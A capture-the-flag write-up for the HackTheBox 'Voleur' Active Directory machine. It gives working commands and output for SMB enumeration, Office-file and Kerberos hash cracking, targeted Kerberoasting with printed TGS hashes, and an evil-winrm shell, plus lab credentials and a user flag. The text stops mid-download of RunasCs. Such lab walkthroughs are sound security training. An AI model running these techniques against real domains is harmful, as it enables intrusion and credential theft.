# Voleur

> Platform: HackTheBox
>
> Created by: [baseDN](https://app.hackthebox.com/users/1514235)
>
> Difficulty: Medium
>
> Status: Season 8 Machine


## 🔗 Overview

_[Voleur](https://app.hackthebox.com/machines/Voleur) starts in an Active Directory domain <code>(voleur.htb)</code>. The box enforces Kerberos (NTLM disabled on many services), which shapes the attack: we escalate from an SMB foothold to domain compromise by combining password cracking, Kerberos ticket abuse, AD object restore, DPAPI secret extraction, and NTDS/SYSTEM offline extraction._

_In short: enumerate SMB → retrieve an Excel with a password-protected secret → crack it and recover <code>svc_ldap</code> creds → obtain a TGT and perform targeted Kerberoast to recover <code>svc_winrm</code> → get an initial WinRM shell and user flag → use <code>RunasCs</code> to run as <code>svc_ldap</code>, restore a deleted user <code>(todd.wolfe)</code> and obtain its Kerberos ticket → extract DPAPI-protected credentials (recover <code>jeremy.combs</code> password) → access the Third-Line share, grab an SSH key and SSH as <code>svc_backup</code> to the WSL (Ubuntu) on the DC → pull <code>ntds.dit</code> + <code>SYSTEM</code> from backups and run <code>secretsdump</code> to recover domain hashes (including Administrator) → build a TGT for Administrator and complete the box (root)._


## 🔍 Enumeration

First of all, we will begin with the Nmap. Actually, you can just use a normal Nmap command, but here is my preferences.
```
┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ nmap -sVSC 10.10.11.76 -T4 -Pn -n -vvv -oA voleurscan
Nmap scan report for 10.10.11.76
Host is up, received user-set (0.047s latency).
Scanned at 2025-10-06 21:05:20 +08 for 56s
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-10-06 13:06:38Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
2222/tcp open  ssh           syn-ack ttl 127 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+vH6cIy1hEFJoRs8wB3O/XIIg4X5gPQ8XIFAiqJYvSE7viX8cyr2UsxRAt0kG2mfbNIYZ+80o9bpXJ/M2Nhv1VRi4jMtc+5boOttHY1CEteMGF6EF6jNIIjVb9F5QiMiNNJea1wRDQ2buXhRoI/KmNMp+EPmBGB7PKZ+hYpZavF0EKKTC8HEHvyYDS4CcYfR0pNwIfaxT57rSCAdcFBcOUxKWOiRBK1Rv8QBwxGBhpfFngayFj8ewOOJHaqct4OQ3JUicetvox6kG8si9r0GRigonJXm0VMi/aFvZpJwF40g7+oG2EVu/sGSR6d6t3ln5PNCgGXw95pgYR4x9fLpn/OwK6tugAjeZMla3Mybmn3dXUc5BKqVNHQCMIS6rlIfHZiF114xVGuD9q89atGxL0uTlBOuBizTaF53Z//yBlKSfvXxW4ShH6F8iE1U8aNY92gUejGclVtFCFszYBC2FvGXivcKWsuSLMny++ZkcE4X7tUBQ+CuqYYK/5TfxmIs=
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMkGDGeRmex5q16ficLqbT7FFvQJxdJZsJ01vdVjKBXfMIC/oAcLPRUwu5yBZeQoOvWF8yIVDN/FJPeqjT9cgxg=
|   256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILv295drVe3lopPEgZsjMzOVlk4qZZfFz1+EjXGebLCR
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 48495/tcp): CLEAN (Timeout)
|   Check 2 (port 31141/tcp): CLEAN (Timeout)
|   Check 3 (port 60782/udp): CLEAN (Timeout)
|   Check 4 (port 62134/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-10-06T13:06:44
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 1m07s

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

From the Nmap results, looks like there are several active directory services running on the server.

Let's try to enumerate the shares in the SMB server using the given credentials:
```
┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ nxc smb dc.voleur.htb -u ryan.naylor -p HollowOct31Nyt --shares -k --dns-server 10.10.11.76
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)                                                      
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt
SMB         dc.voleur.htb   445    dc               [*] Enumerated shares
SMB         dc.voleur.htb   445    dc               Share           Permissions     Remark
SMB         dc.voleur.htb   445    dc               -----           -----------     ------
SMB         dc.voleur.htb   445    dc               ADMIN$                          Remote Admin                                                                                          
SMB         dc.voleur.htb   445    dc               C$                              Default share                                                                                         
SMB         dc.voleur.htb   445    dc               Finance                         
SMB         dc.voleur.htb   445    dc               HR                              
SMB         dc.voleur.htb   445    dc               IPC$            READ            Remote IPC                                                                                            
SMB         dc.voleur.htb   445    dc               IT              READ            
SMB         dc.voleur.htb   445    dc               NETLOGON        READ            Logon server share                                                                                    
SMB         dc.voleur.htb   445    dc               SYSVOL          READ            Logon server share 
```

Due to the <code>(NTLM:false)</code>, we need to ask the Kerberos server to create the ticket for us (Make sure to sync the clock time):
```
┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ date                       
Tue Oct  7 03:22:22 AM +08 2025
                                                                                             
┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ sudo ntpdate -s 10.10.11.76
[sudo] password for kali: 
                                                                                             
┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ date
Tue Oct  7 03:39:56 AM +08 2025

┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ python3 /opt/impacket/examples/getTGT.py voleur.htb/ryan.naylor:'HollowOct31Nyt'
Impacket v0.13.0.dev0+20250808.170117.00f43cf7 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in ryan.naylor.ccache
                                                                                             
┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ export KRB5CCNAME=ryan.naylor.ccache  
                                                                                             
┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ klist -c $KRB5CCNAME 
Ticket cache: FILE:ryan.naylor.ccache
Default principal: ryan.naylor@VOLEUR.HTB

Valid starting       Expires              Service principal
10/07/2025 01:27:46  10/07/2025 11:27:46  krbtgt/VOLEUR.HTB@VOLEUR.HTB
        renew until 10/08/2025 01:23:33
                                                                                             
┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ python3 /opt/impacket/examples/smbclient.py voleur.htb/ryan.naylor@dc.voleur.htb -k -no-pass -dc-ip 10.10.11.76
Impacket v0.13.0.dev0+20250808.170117.00f43cf7 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
Finance
HR
IPC$
IT
NETLOGON
SYSVOL
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 17:10:01 2025 .
drw-rw-rw-          0  Fri Jul 25 04:09:59 2025 ..
drw-rw-rw-          0  Wed Jan 29 17:40:17 2025 First-Line Support
# 
```

After we are in the SMB IT share, there is an excel file seems to be interesting. Let's retrieve the file and open the file:
```
# cd First-Line Support
# ls
drw-rw-rw-          0  Wed Jan 29 17:40:17 2025 .
drw-rw-rw-          0  Wed Jan 29 17:10:01 2025 ..
-rw-rw-rw-      16896  Fri May 30 06:23:36 2025 Access_Review.xlsx
# get Access_Review.xlsx
```

When opening the excel file, it looks like it is protected with a password:

![excelprotected](excelpasswordprotected.png)

## ⚔️ Exploitation

We can try to crack the excel file by using John:
```
┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ office2john Access_Review.xlsx > Access_Review.hash
                                                                                             
┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt Access_Review.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 128/128 AVX 4x / SHA512 128/128 AVX 2x AES])
Cost 1 (MS Office version) is 2013 for all loaded hashes
Cost 2 (iteration count) is 100000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
football1        (Access_Review.xlsx)     
1g 0:00:00:02 DONE (2025-10-06 21:34) 0.3731g/s 298.5p/s 298.5c/s 298.5C/s football1..martha
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Now, try to view the excel file to get some more information:

![excelfile](excelfile.png)

From here, we get to know more users and some of its passwords. We can try to use the user <code>svc_ldap</code> to gather some more information using Bloodhound:
```
┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ nxc ldap 10.10.11.76 -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' --dns-server 10.10.11.76 -k --bloodhound --collection all
LDAP        10.10.11.76     389    DC               [*] None (name:DC) (domain:voleur.htb)
LDAP        10.10.11.76     389    DC               [+] voleur.htb\svc_ldap:M1XyC9pW7qT5Vn 
LDAP        10.10.11.76     389    DC               Resolved collection methods: trusts, group, objectprops, psremote, acl, container, localadmin, session, dcom, rdp                     
LDAP        10.10.11.76     389    DC               Using kerberos auth without ccache, getting TGT                                                                                       
LDAP        10.10.11.76     389    DC               Done in 00M 09S
LDAP        10.10.11.76     389    DC               Compressing output into /home/kali/.nxc/logs/DC_10.10.11.76_2025-10-06_213711_bloodhound.zip
```

After uploading the <code>.zip</code> file into Bloodhound, we can try to map out our next attack paths. From the excel file that we had retrieved before, the user <code>svc_winrm</code> looks interesting here, but it has something to do with user <code>lacey.miller</code>. Try to map our attack path from the current user <code>svc_ldap</code>:

![bloodhound](bloodhound.png)

From user <code>svc_ldap</code>, we can try to abuse the **targeted kerberoast attack**. Make sure to request the ticket for the user <code>svc_ldap</code> first:
```
┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ python3 /opt/impacket/examples/getTGT.py voleur.htb/svc_ldap:'M1XyC9pW7qT5Vn' -dc-ip 10.10.11.76 
Impacket v0.13.0.dev0+20250808.170117.00f43cf7 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_ldap.ccache

┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ export KRB5CCNAME=svc_ldap.ccache

┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ klist -c $KRB5CCNAME
Ticket cache: FILE:svc_ldap.ccache
Default principal: svc_ldap@VOLEUR.HTB

Valid starting       Expires              Service principal
10/06/2025 22:49:25  10/07/2025 08:49:25  krbtgt/VOLEUR.HTB@VOLEUR.HTB
        renew until 10/07/2025 22:49:09

┌──(venv)─(kali㉿kali)-[~/upload/targetedKerberoast]
└─$ python3 targetedKerberoast.py -v -d voleur.htb -u "svc_ldap" -p 'M1XyC9pW7qT5Vn' -k --dc-ip 10.10.11.76 --dc-host dc.voleur.htb
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (lacey.miller)
[+] Printing hash for (lacey.miller)
$krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$402f27f0c8bdd765617a9576d4d7206b$e760ac2c20fe41061005ebc36be60c31383c25011e13e94b9442a8998899a9d91652c91a39f5e3b14828f01acbef0ffd7153d3c7064ea8820773023bdaf7278529fe85986020fd8411f5b1edcf41593caeb3204f7274e234480b046c1e7c0c2575cea51e1a74058eabbde1b9d5a633b169ff78620c0069eb550385531557bb85e2ab7e3fce6f96c6204349e70a011b73eea5b87e09cd837304af3d49d2500a3c4e0812ba99be56466cf5f24f718368f62c0345a8bac658e7d896d6162f4540c47abc92f9487b807da999a98c5b8552d2d48390cf20d95d6d6fc640e26ddc98800700946acee2566e50222addecc6458278b20dcc4e8b2ebc06abc50522bcd84895d9962118ac091846338bb3661b159a72ee1cab0c60ef17382a14685a59913a4b0523691e7a5cb394162bfe2823eb79482ad5e44d641a421df5a57686f7176b7582d302ab8a6420aafab77c5b70738a412c38393a97e6fdab72f3f4c33ccd38dfb846e04b49a2a0fcb10addea99b7a5b57cfae2291b1753459b95fce1c7da70576e0a4d6b1a0883cf0229fdc83f439e7dfcca84efec496ae3930dc0f308b967693c5a7b5468e94e0d3ccea23aa0be4914877b0d14db57ba4d11b263810db9e6f6f90b569885ae9b52a59f7712c701e096cba819422d99a6993a494e5a1c78f07789ec6982ac8ee4704479ecb78a4d7bec6fcbaead147d2bac464fd49d2f665f39be9f13402e9ffbbf01a10ed469742892d6356763963cd027098651656ce2abef3c179cbbf9188b470f695dc0b77cebf2c7d06749b4f7fecc96e036108db6a21880d4e434ab7a109ca52da5cf5affebbb166bebc1fc43ef5527e2c8f9b6af22fd795113ffc8a3ffe5b088c98b7ef6fa22e53a8e83540bba91e32a1f123087ee1a3b09463a5d124044367050ffc0737e0c6c849f06f3c2191d467bc9cf949993092568b3fdda5d9819ce54033c7c3851ca172d6eff1a0b1e15e0d54ea0c312c9d4cd11f6795cc6bc420fbc837cbb8669b29fdd7440e61690a814936719d6e03a23947a4aae6f5d9074c8406c9680e05f20587a0eb959c1b9852f9eeb872c903ace8f714ec78564bc3472ef10e591ddd2d59a1e3c991292a637487974462900f2e7888335cf30aac533cfe6ad80c750080ea5d4c3e49267d7600c19743c41ac11512a9fe20415e8f61bbadec6826ab4282f7b8efa8592c322f37b2156a4c5eba2d5cdb991926b1a5f2234e05984a3caaf67063b2bc2764592450c0b97e58d0be2c60b0a74cba1e20e8abc45352abd432f88084ca805fbece5e7b2dc9941b924e0338abc6d2264242358331c9474afb9bf2c49b9cff9488b6acc0c3194ce3caee2d4905aef1795e7bddc7b304fa1ab213728c1165aeaa3897276251852c5b1fd4130d11975232f71792a476635577126674bafdd242ee22e9487c8041b774dda753633bcec5e5fb1a98a09aa5a5c53004485d05c
[VERBOSE] SPN removed successfully for (lacey.miller)
[VERBOSE] SPN added successfully for (svc_winrm)
[+] Printing hash for (svc_winrm)
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$176c8e39f88f685ceeaf2db54bc19ba2$aacd5c508a3b35eae9b53508ed559acfaa7d22129b452ae0bcf666efda0a30bd5cf45f54b37b73b2d0606846e489dbc7ee802cb59a4c51f90da212424174682a890e747661020bd56a201d9c7a38530d0f6ae1dae6f02338c64dd51da73b6af043e4f6709d0584ea5d28a428d378e40bfb0dcf4374f4c56d24d8dd745a826f1a51f56b39f42f34d3b82d1bb31fa23f5fd7cf1d0e3989cf77a6ec9c326563da7ad561c50c65ed5e5e0a6c59db1e14beed1dc4ecb4d658473828743c15469f66a82c8a0b9c7ea26908e0d377904fffe873bac861185dd308641e26ad9718089f2951a94ef77c6443fdb7266d473a328a26315967f36fbf20228e44e6c10ddb4ceab70413a3a443be0a0ae42ff35fb3de27bd634850e2edf8f036abd4fb7427697914ad1d0affa601982926f68a6b4cd10d6577089ca820df35acd03b6c01a7936639fd220dd93d21c9ce986e59dc47068ea3e3d2fe90e873d82acb890a27bce1a5b8c4a4f3db94d3b788419ede4d2ea18b52ec703d538215b9fc07af49fb6bd8dcc293139086ce6f5721d8c34587b9e1b178d093c88664cf3fe92ecaaa8db7042634e6084e1803e7e2b495141cc5e97334be80f4304995e44801a2b078127dc832a06d286d96bc33cfd0db1c30851743875ab04ef5dbaf7860e0463115fd0e9530145d64b805a7f5ef1f1214f9bf3e2f61354bbd00d03725e7784f8772dd9769ab2419e4ed3a11980e30d897bc90b82df72c59952f578801eb273e087365ff9e83b4cd859430b42b4bfee9463751637a90a87c6f3ac777e0623766d4103cfd5b5cfd0c6d362a3503d489901e1d2c55a513a66314ee626932a1c09e8d1edec2e23c2a70188e456566559f9bff097bf75aa3fbe9fe66ad0a2a29a0e67989ec00045563451b1b40fc6fb4bf966bc23b00ed87686af9e6df3f5b3abeebb6b04892d6d117ba07c624719bfdc317fdc7630d2c8dc18b4b3ddc0ea1aeca73f99bd5d9c86b797205fd97644e9cb0eac517613b39b18ac58b40acca49175ac5655cbc96d93c528910d7c3e1cd16bad802162846ac802d7d2513a2bbe7e2a0b0db3e665247e7333405bfdc17cadfe72dcfb881da84c26b736cf6ad6249c5c470cc8b46e851220412564498ee3f4c8c046576d06acd295053fd1e535e8fcb7586c1e14d09a1951dbad9bdcf862d16cd1fb63d8c21d754f00f49adc86650933b2334c6b2e737f744b22e23be12b73b545b4200b196bec0ea8202d1eeb4635551790d39fb6cacac0478b1924bee7ddca3242b851e8b9400d0ff67cd69348d329ae5fa944e0ecdbe646d9e36367fd40dc8a75ea9aa7668578441c31decb907f041d94a226fb46c08e660525c2afdf2b7c0d104e64979019362226c00429f5e91d2bcfbee4af6f4226ec20f043fa7759e6ad5f1dea55eeddbbe394c9030b858e168dc810e8686064f051d56d1ccac53ef2cbe1ba3faf0f0bf1e0241
[VERBOSE] SPN removed successfully for (svc_winrm)
```

Now, we can save the hashes of the users and crack it using John:
```
┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ echo '$krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$402f27f0c8bdd765617a9576d4d7206b$e760ac2c20fe41061005ebc36be60c31383c25011e13e94b9442a8998899a9d91652c91a39f5e3b14828f01acbef0ffd7153d3c7064ea8820773023bdaf7278529fe85986020fd8411f5b1edcf41593caeb3204f7274e234480b046c1e7c0c2575cea51e1a74058eabbde1b9d5a633b169ff78620c0069eb550385531557bb85e2ab7e3fce6f96c6204349e70a011b73eea5b87e09cd837304af3d49d2500a3c4e0812ba99be56466cf5f24f718368f62c0345a8bac658e7d896d6162f4540c47abc92f9487b807da999a98c5b8552d2d48390cf20d95d6d6fc640e26ddc98800700946acee2566e50222addecc6458278b20dcc4e8b2ebc06abc50522bcd84895d9962118ac091846338bb3661b159a72ee1cab0c60ef17382a14685a59913a4b0523691e7a5cb394162bfe2823eb79482ad5e44d641a421df5a57686f7176b7582d302ab8a6420aafab77c5b70738a412c38393a97e6fdab72f3f4c33ccd38dfb846e04b49a2a0fcb10addea99b7a5b57cfae2291b1753459b95fce1c7da70576e0a4d6b1a0883cf0229fdc83f439e7dfcca84efec496ae3930dc0f308b967693c5a7b5468e94e0d3ccea23aa0be4914877b0d14db57ba4d11b263810db9e6f6f90b569885ae9b52a59f7712c701e096cba819422d99a6993a494e5a1c78f07789ec6982ac8ee4704479ecb78a4d7bec6fcbaead147d2bac464fd49d2f665f39be9f13402e9ffbbf01a10ed469742892d6356763963cd027098651656ce2abef3c179cbbf9188b470f695dc0b77cebf2c7d06749b4f7fecc96e036108db6a21880d4e434ab7a109ca52da5cf5affebbb166bebc1fc43ef5527e2c8f9b6af22fd795113ffc8a3ffe5b088c98b7ef6fa22e53a8e83540bba91e32a1f123087ee1a3b09463a5d124044367050ffc0737e0c6c849f06f3c2191d467bc9cf949993092568b3fdda5d9819ce54033c7c3851ca172d6eff1a0b1e15e0d54ea0c312c9d4cd11f6795cc6bc420fbc837cbb8669b29fdd7440e61690a814936719d6e03a23947a4aae6f5d9074c8406c9680e05f20587a0eb959c1b9852f9eeb872c903ace8f714ec78564bc3472ef10e591ddd2d59a1e3c991292a637487974462900f2e7888335cf30aac533cfe6ad80c750080ea5d4c3e49267d7600c19743c41ac11512a9fe20415e8f61bbadec6826ab4282f7b8efa8592c322f37b2156a4c5eba2d5cdb991926b1a5f2234e05984a3caaf67063b2bc2764592450c0b97e58d0be2c60b0a74cba1e20e8abc45352abd432f88084ca805fbece5e7b2dc9941b924e0338abc6d2264242358331c9474afb9bf2c49b9cff9488b6acc0c3194ce3caee2d4905aef1795e7bddc7b304fa1ab213728c1165aeaa3897276251852c5b1fd4130d11975232f71792a476635577126674bafdd242ee22e9487c8041b774dda753633bcec5e5fb1a98a09aa5a5c53004485d05c' > lacey.miller.hash
                                                                                             
┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ echo '$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$176c8e39f88f685ceeaf2db54bc19ba2$aacd5c508a3b35eae9b53508ed559acfaa7d22129b452ae0bcf666efda0a30bd5cf45f54b37b73b2d0606846e489dbc7ee802cb59a4c51f90da212424174682a890e747661020bd56a201d9c7a38530d0f6ae1dae6f02338c64dd51da73b6af043e4f6709d0584ea5d28a428d378e40bfb0dcf4374f4c56d24d8dd745a826f1a51f56b39f42f34d3b82d1bb31fa23f5fd7cf1d0e3989cf77a6ec9c326563da7ad561c50c65ed5e5e0a6c59db1e14beed1dc4ecb4d658473828743c15469f66a82c8a0b9c7ea26908e0d377904fffe873bac861185dd308641e26ad9718089f2951a94ef77c6443fdb7266d473a328a26315967f36fbf20228e44e6c10ddb4ceab70413a3a443be0a0ae42ff35fb3de27bd634850e2edf8f036abd4fb7427697914ad1d0affa601982926f68a6b4cd10d6577089ca820df35acd03b6c01a7936639fd220dd93d21c9ce986e59dc47068ea3e3d2fe90e873d82acb890a27bce1a5b8c4a4f3db94d3b788419ede4d2ea18b52ec703d538215b9fc07af49fb6bd8dcc293139086ce6f5721d8c34587b9e1b178d093c88664cf3fe92ecaaa8db7042634e6084e1803e7e2b495141cc5e97334be80f4304995e44801a2b078127dc832a06d286d96bc33cfd0db1c30851743875ab04ef5dbaf7860e0463115fd0e9530145d64b805a7f5ef1f1214f9bf3e2f61354bbd00d03725e7784f8772dd9769ab2419e4ed3a11980e30d897bc90b82df72c59952f578801eb273e087365ff9e83b4cd859430b42b4bfee9463751637a90a87c6f3ac777e0623766d4103cfd5b5cfd0c6d362a3503d489901e1d2c55a513a66314ee626932a1c09e8d1edec2e23c2a70188e456566559f9bff097bf75aa3fbe9fe66ad0a2a29a0e67989ec00045563451b1b40fc6fb4bf966bc23b00ed87686af9e6df3f5b3abeebb6b04892d6d117ba07c624719bfdc317fdc7630d2c8dc18b4b3ddc0ea1aeca73f99bd5d9c86b797205fd97644e9cb0eac517613b39b18ac58b40acca49175ac5655cbc96d93c528910d7c3e1cd16bad802162846ac802d7d2513a2bbe7e2a0b0db3e665247e7333405bfdc17cadfe72dcfb881da84c26b736cf6ad6249c5c470cc8b46e851220412564498ee3f4c8c046576d06acd295053fd1e535e8fcb7586c1e14d09a1951dbad9bdcf862d16cd1fb63d8c21d754f00f49adc86650933b2334c6b2e737f744b22e23be12b73b545b4200b196bec0ea8202d1eeb4635551790d39fb6cacac0478b1924bee7ddca3242b851e8b9400d0ff67cd69348d329ae5fa944e0ecdbe646d9e36367fd40dc8a75ea9aa7668578441c31decb907f041d94a226fb46c08e660525c2afdf2b7c0d104e64979019362226c00429f5e91d2bcfbee4af6f4226ec20f043fa7759e6ad5f1dea55eeddbbe394c9030b858e168dc810e8686064f051d56d1ccac53ef2cbe1ba3faf0f0bf1e0241' > svc_winrm.hash
                                                                                             
┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt svc_winrm.hash                
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
AFireInsidedeOzarctica980219afi (?)     
1g 0:00:00:02 DONE (2025-10-06 22:52) 0.3401g/s 3902Kp/s 3902Kc/s 3902KC/s AHANACK6978012..ADRIANAH
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                             
┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt lacey.miller.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:03 DONE (2025-10-06 22:54) 0g/s 4333Kp/s 4333Kc/s 4333KC/s !)(OPPQR..*7¡Vamos!
Session completed. 
```

Looks like the user <code>svc_winrm</code> is crackable. Now, we can try to request the ticket for the user <code>svc_winrm</code>, then create the <code>krb5.conf</code> file before we can use <code>evil-winrm</code> to the server:
```
┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ python3 /opt/impacket/examples/getTGT.py voleur.htb/svc_winrm:'AFireInsidedeOzarctica980219afi' -dc-ip 10.10.11.76 
Impacket v0.13.0.dev0+20250808.170117.00f43cf7 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_winrm.ccache

┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ export KRB5CCNAME=svc_winrm.ccache

┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ sudo nxc smb dc.voleur.htb -u svc_winrm -p 'AFireInsidedeOzarctica980219afi' -k --generate-krb5-file /etc/krb5.conf --dns-server 10.10.11.76 

SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)                                                      
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\svc_winrm:AFireInsidedeOzarctica980219afi
                                                                                             
┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ cat /etc/krb5.conf                                   

[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = VOLEUR.HTB

[realms]
    VOLEUR.HTB = {
        kdc = dc.voleur.htb
        admin_server = dc.voleur.htb
        default_domain = voleur.htb
    }

[domain_realm]
    .voleur.htb = VOLEUR.HTB
    voleur.htb = VOLEUR.HTB

┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Voleur]
└─$ evil-winrm -i dc.voleur.htb -r voleur.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                          
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                     
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_winrm\Documents>
```

<details>
<summary><b>🏳️user.txt</b></summary>
<b><code>40d68f5fd736504e432df80cb7e243e8</code></b>
</details><br>


## 💀 Privilege Escalation

Next, from the Bloodhound also, we currently know that we did not get the access for the user <code>lacey.miller</code>, but the user <code>svc_ldap</code> is a member of the <code>RESTORE_USERS</code> group. Therefore, we can try to [restore a deleted AD user](https://learn.microsoft.com/en-us/powershell/module/activedirectory/restore-adobject?view=windowsserver2025-ps), which is the user <code>todd.wolfe</code>:

![bloodhound](bloodhound.png)

First, we must need to have the shell as user <code>svc_ldap</code>. We need to use the [<code>RunasCs</code>](https://github.com/antonioCoco/RunasCs) to spawn a powershell as the user <code>svc_ldap</code> from the user <code>svc_winrm</code> shell. Host the http server in our attacking machine to send it to the machine then run it:
```
┌──(kali㉿kali)-[~/upload]
└─$ wget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip
--2025-10-07 00:03:45--  https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip
Resolving github.com (github.com)... 20.205.243.166
Connecting to github.com (github.com)|20.205.243.166|:443... connected.
HTTP request sent, awaiting response... 302 Found
